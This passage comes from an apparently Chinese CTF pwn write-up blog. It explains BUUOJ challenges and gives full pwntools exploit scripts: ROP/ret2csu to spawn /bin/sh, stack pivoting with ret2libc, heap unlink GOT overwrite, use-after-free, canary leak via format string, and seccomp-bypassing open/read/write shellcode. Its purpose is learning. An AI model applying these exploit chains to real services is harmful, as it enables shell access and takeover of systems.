新问题是sys_read后<strong>我们的字符串</strong>在什么地址上? 所以需要<strong>leak</strong>出某一个有用的地址</p></li><li><p>gdb调试:</p><p>b vuln-&gt;run-&gt;continue-&gt; aaaaaaaaa(测试输入)-&gt;发现栈的<u>基地址</u> </p><ul><li><p>不得不说的就是这个<strong>栈的基地址</strong>, 一般是main函数参数中argv[0]即文件的路径, gdb中会写成这个样子</p><p> <code>0xffffd0ec —▸ 0xffffd204 —▸ 0xffffd3c4 ◂— &#39;/root/Desktop/fm&#39;</code> </p><p> 取第一次解引用的地址即为栈的基地址, 减去rsp得到<strong>0x118</strong> </p><p> 栈的基地址长这样子, 有path的那条就是, 下面一大串的是环境变量envp</p> <img src="https://i.loli.net/2021/08/06/R2XcmJiCe7lG3Lo.png" alt="image-20210806235944050" style="zoom: 80%;" /> </li></ul></li><li><p><strong>要注意的是,</strong> pop指令弹出的是栈上指针对应地址的数据, 平时栈溢出填充的很容易以为直接就是数据, 实际上在这种情况下应该写成一个地址, 指向payload中后面的参数, 如下sh+0x50指向mov_rax</p><p><img src="https://i.loli.net/2021/08/07/j9ZSDorqgbEfGvy.png"> </p></li><li><p>详细注释:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import*</span><br>context.binary = <span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span><br>context.log_level= <span class="hljs-string">&#x27;debug&#x27;</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>rn=<span class="hljs-keyword">lambda</span> x:io.recv (x)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, xxxxx)<br>vuln=<span class="hljs-number">0x4004ed</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br>csu_end=<span class="hljs-number">0x40059a</span><br>csu_front=<span class="hljs-number">0x400580</span><br>mov_rax=<span class="hljs-number">0x4004e2</span><br>syscall=<span class="hljs-number">0x400517</span><br><span class="hljs-comment">#第一次的目的是leak基地址, 填上数组的16字节即可, 返回地址继续回到vuln</span><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(vuln)<br>sl(payload)<br>rn(<span class="hljs-number">0x20</span>)<br>binsh=u64(rn(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span><br><span class="hljs-comment">#        输入binsh     填完数组  即csuend      即mov_rax地址   rbx,rbp填为0    r13-r15全为0</span><br>payload= <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>+ p64(<span class="hljs-number">0</span>)+  p64(csu_end)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+      p64(binsh+<span class="hljs-number">0x50</span>)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br><span class="hljs-comment">#即csufront     ROPgadget    execve首参数  mov系统调用号   最后syscall59执行execve   </span><br>+p64(csu_front)+p64(pop_rdi)+p64(binsh)+  p64(mov_rax)+  p64(syscall) <br><br>sl(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p> <strong>附: SROP<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">[CTF-WiKi]</a></strong> <strong>[<a href="https://blog.csdn.net/qinying001/article/details/104291387">writeup</a>]</strong> </p><ul><li><p>简单说来SROP就是调用sigreturn函数改写所有寄存器的值, 然后再执行rip指向的地址</p><p>本题中流程为: 泄露栈基地址-&gt;构造frame = SigreturnFrame()-&gt;填满数组, mov调用号15, syscall地址, bytes(frame)</p></li></ul><h2 id="13-babyheap-0ctf-2017"><a href="#13-babyheap-0ctf-2017" class="headerlink" title="13.babyheap_0ctf_2017"></a>13.babyheap_0ctf_2017</h2><p>看了老半天源代码和基础知识</p><p>估摸着我得过几天复习复习, 可不能忘记了</p><p><a href="https://blog.csdn.net/huzai9527/article/details/114807930?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.base&spm=1001.2101.3001.4242">别人的详细的wp</a>  <a href="https://bbs.pediy.com/thread-223461.htm">看雪 不太详细</a> </p><h2 id="14-Black-Watch-入群题-PWN"><a href="#14-Black-Watch-入群题-PWN" class="headerlink" title="14.[Black Watch 入群题]PWN"></a>14.[Black Watch 入群题]PWN</h2><p>又是一种没见过的方法, 名为<strong>栈转移</strong>, 用于栈溢出不够, 以leave ret结尾, 有或能够向bss段写入数据的, 将<strong>rsp</strong>转移到<strong>bss</strong>段</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">leave = mov rsp, rbp pop rbp    <br>ret =  pop rip<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs flow">st=&gt;parallel: 流程:<br>opa1=&gt;start: 填满栈上数组, <br>覆盖ebp为bss段某一地址<br>opa2=&gt;start: 修改返回地址为leave&amp;ret的gadget<br>opb1=&gt;start: 往bss写入4字节数据作为第二次 pop rbp<br>opb2=&gt;start: 如果未知sys,/bin/sh等地址<br>可用此次leak地址然后在下一次执行system函数<br>a=&gt;parallel: 结束<br>st(path1, left)-&gt;opa1-&gt;opa2<br>st(path2, right)-&gt;opb1-&gt;opb2<br>opa2-&gt;a<br>opb2-&gt;a<br><br></code></pre></div></td></tr></table></figure><p>…</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;./spwn&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25611</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;spwn&quot;</span>)<br><br>bss_s = <span class="hljs-number">0x0804A300</span><span class="hljs-comment">#将fake栈迁移到bss中</span><br>leave_ret = <span class="hljs-number">0x08048511</span><span class="hljs-comment">#栈迁移所需要的的地址</span><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#plt表可以调用write函数</span><br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#got表里有write函数的真实地址</span><br>main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<span class="hljs-comment">#控制函数执行流需要再次回到主函数</span><br><span class="hljs-comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><span class="hljs-comment"># 上面将一些执行流程写入了bss段</span><br><span class="hljs-comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> <span class="hljs-comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span><br>payload += p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>)) <span class="hljs-comment">#接收泄露的地址</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>, write_addr) <span class="hljs-comment">#利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span><br>libc_base = write_addr - libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<span class="hljs-comment">#获取libc的基地址</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span><br><span class="hljs-comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)<br>payload += p32(binsh_addr)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> + p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="15-easyheap"><a href="#15-easyheap" class="headerlink" title="15.easyheap"></a>15.easyheap</h2><p><strong>exp:</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf=ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br>sh = remote(<span class="hljs-string">&quot;slkdfjsldkf&quot;</span>, <span class="hljs-number">932487</span>)<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system_plt=elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>context.binary = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>ptr=<span class="hljs-number">0x6020e8</span><span class="hljs-comment"># heaparray[1]的指针的地址</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Size of Heap : &quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Content of heap:&quot;</span>)<br>    sh.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, size, content</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Size of Heap : &quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Content of heap : &quot;</span>)<br>    sh.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><span class="hljs-comment">#创建三个chunk</span><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)<br>payload+=p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#使用unlink修改heaparray</span><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free_got)<br>payload+=p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>sh.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><ul><li>最妙之处在于将free_got改为system_got, 然后又因为free和system都是指针类型, 只要伪造一个字符串指针就可以用free来执行system</li><li>主要步骤:<ul><li>在chunk1的user date里造一个fake chunk header, 注意到chunk2的PREV_SIZE被修改为20, inuse_bit为0, 以及设置”空”chunk的fd和bk指针, 以避开FD-&gt;bk == BK-&gt;fd == victim的检查</li><li>这样释放chunk2之后unlink就会使用<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code>后向合并, chunk1的user date变成另一个chunk, 并修改heaparray[1]为FD(ptr-0x18)</li><li>再次编辑chunk1, 由于heaparray[1]已经指向ptr-0x18, 所以填充两个64位0, 将[0]覆盖为free_got表的地址, [1]指向FD, [2]指向后8字节的”bin/sh”</li><li>编辑heaparray[0], 修改free_got的值为system_got</li><li>然后delete(2), 这时调用system_got, 参数是存储在该位置的指针, 值为binsh的地址, 成功执行</li></ul></li></ul><img src="https://i.loli.net/2021/08/19/VePjdSGNFOpEM6o.png" alt="654" style="zoom:50%;" /> <h2 id="16-hacknote"><a href="#16-hacknote" class="headerlink" title="16.hacknote"></a>16.hacknote</h2><p>比较简单的一道heap题, 主要是UAF</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29324</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>  r.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>mag = elf.sym[<span class="hljs-string">&quot;magic&quot;</span>]<br>add(<span class="hljs-number">12</span>, p32(mag)) <span class="hljs-comment">#2</span><br>printf(<span class="hljs-number">1</span>)<br>r.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="17-bjdctf-2020-babyrop2"><a href="#17-bjdctf-2020-babyrop2" class="headerlink" title="17.bjdctf_2020_babyrop2"></a>17.bjdctf_2020_babyrop2</h2><p>这题是leak canary + return2libc, 这个值好像不会变呐, 我再去查查</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./bjdctf_2020_babyrop2&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29934</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br><span class="hljs-comment">#</span><br>elf = ELF(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>vuln = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400993</span><br><br>sla(<span class="hljs-string">&#x27;u!\n&#x27;</span>, <span class="hljs-string">&#x27;%7$p&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rn(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, puts_got, puts_plt, vuln])<br>sla(<span class="hljs-string">&#x27;ry!\n&#x27;</span>, payload)<br><br>puts_addr = u64(rn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, binsh, sys])<br>sl(payload)<br>sl(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="18-pwnable-orw"><a href="#18-pwnable-orw" class="headerlink" title="18.pwnable_orw"></a>18.pwnable_orw</h2><p>看上去像是很简单的shellcraft, 但是第一个函数就有点特别了:</p><p><img src="https://i.loli.net/2021/09/14/vONRPQkUxKWjALD.png" alt="image-20210914223414394"></p><ul><li>seccomp()函数查看</li><li>使用seccomp-tools:</li></ul><p><img src="https://i.loli.net/2021/09/14/oTh3rR9IzGwv6aC.png" alt="image-20210914223259160"></p><ul><li>看出仅可使用open, read, write这几个有用的函数</li><li>exp: (<a href="https://cloud.tencent.com/developer/article/1815026">这里是手写汇编调用syscall</a>)</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;node.buuoj.cn&#x27;</span>,<span class="hljs-number">25539</span>)<br><br>context.binary = <span class="hljs-string">&#x27;./orw&#x27;</span><br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#读取到栈中</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#打在标准输出上</span><br>shellcode = asm(shellcode)<br><br>sleep(<span class="hljs-number">0.2</span>)<span class="hljs-comment">#意义不明</span><br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p><strong>新机制: seccomp</strong> </p><blockquote><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p></blockquote><p><img src="https://i.loli.net/2021/09/13/ekGP6w4rBUmzyFn.png" alt="image-20210913162407923"></p><p>可以看到调用了一个新的函数<code>prctl()</code>. 具体的<a href="https://www.man7.org/linux/man-pages/man2/prctl.2.html">LInux Man Page</a>和<a href="https://code.woboq.org/userspace/include/linux/prctl.h.html">option使用的宏定义</a>在此</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,</span></span><br><span class="hljs-params"><span class="hljs-function">                 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></div></td></tr></table></figure><p>对于第一个<code>prctl()</code>, 38就是<code>PR_SET_NO_NEW_PRIVS</code>, 因此可以查到作用是: </p><blockquote><p>set the calling thread’s no_new_privs attribute to thevalue in <em>arg2</em>. With no_new_privs set to 1, execve(2)<br>promises not to grant privileges to do anything that couldnot have been done without the execve(2) call 